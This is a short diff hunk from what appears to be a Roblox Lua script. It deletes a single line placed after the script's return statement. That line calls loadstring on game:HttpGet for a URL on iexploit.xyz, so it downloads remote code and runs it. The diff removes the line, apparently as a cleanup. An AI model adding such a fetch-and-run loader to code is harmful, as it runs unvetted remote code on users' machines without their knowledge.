@@ -2272,6 +2272,6 @@ function swagnames()
 end
 local success,err = pcall(swagnames)
 return ModIDS
-loadstring(game:HttpGet('https://iexploit.xyz/plasma/mod/loadmod'))()
+
 
 
